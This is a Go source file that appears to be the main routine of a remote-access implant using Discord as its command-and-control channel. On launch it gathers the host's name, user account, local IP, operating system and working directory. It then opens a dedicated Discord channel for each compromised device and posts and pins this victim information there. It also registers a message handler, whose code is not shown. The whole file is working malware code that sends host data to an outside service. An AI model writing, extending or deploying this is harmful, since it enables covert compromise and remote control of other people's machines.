package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

// main initializes the Discord session and opens or reuses a per-device control channel.
func main() {
	loadEnvFile(".env")
	guildID = os.Getenv("DISCORD_GUILD_ID")
	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token == "" || guildID == "" {
		return
	}
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		// Error creating Discord session
		return
	}

	// Handler for CreateMessage events
	dg.AddHandler(handler)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		// Error opening connection
		return
	}

	// Create new channel
	rand.Seed(time.Now().UnixNano())
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ipStr := localAddr.IP.String()
	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
	cwd, _ := os.Getwd()
	var categoryName string
	switch runtime.GOOS {
	case "windows":
		categoryName = "Windows"
	case "linux":
		categoryName = "Linux"
	case "darwin":
		categoryName = "Mac"
	default:
		categoryName = "Other"
	}
	categoryID, err := getOrCreateCategory(dg, categoryName)
	if err != nil {
		return
	}
	channelName := fmt.Sprintf("%s-%s",
		strings.ToLower(hostname),
		strings.ToLower(currentUser.Username),
	)
	channelID, err := getOrCreateDeviceChannel(dg, categoryID, channelName)
	if err != nil {
		return
	}
	myChannelId = channelID

	// Send first message with basic info (and pin it)
	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
	dg.ChannelMessagePin(myChannelId, m.ID)

	// Bot is now running (CTRL+C to quit)
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}
